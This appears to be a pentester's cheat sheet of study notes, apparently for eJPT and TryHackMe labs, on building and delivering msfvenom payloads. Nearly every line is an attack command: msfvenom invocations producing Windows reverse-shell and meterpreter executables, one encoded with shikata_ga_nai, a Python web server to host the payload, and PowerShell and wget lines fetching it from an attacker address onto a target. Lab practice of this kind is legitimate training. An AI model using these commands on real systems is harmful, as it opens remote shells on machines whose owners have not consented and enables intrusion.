Standalone payload generator

Cheatsheet: https://github.com/xonoxitron/INE-eJPT-Certification-Exam-Notes-Cheat-Sheet/blob/main/README.md#msfvenom-shells

```
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_Attacker_IP> LPORT=<Your_Port> -f exe > shell.exe
```

msfvenom to create a Windows meterpreter reverse shell using the following payload:
``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[vpnIP] LPORT=[LPORT] -f exe > reverse.exe
```

another basic Windows Reverse shell. Not sure what x86/shikata_ga_nai is. used in TryHackMe Steel Mountain Room
``` bash 
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```


### Usage:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > reverse.exe
```

We start the python server to serve the exploit on the machine

```shell
python3 -m http.server <PORT>
```

Depending if the target is windows or linux

Windows:
``` powershell
powershell Invoke-WebRequest -Uri http://<Attack_ip>:<PORT>/reverse.exe -Outfile powerview.ps1
```
linux 
``` bash
wget http://example:<portnumber>/file.txt
```

#### **MSF Staged and Non Staged Payload**

```shell
# MSF STAGED Payload
windows/x64/meterpreter/reverse_tcp

# MSF NON-STAGED Payload
windows/x64/meterpreter_reverse_https
```

powershell Invoke-WebRequest -Uri http://10.10.14.55:80/powerview.ps1 -Outfile powerview.ps1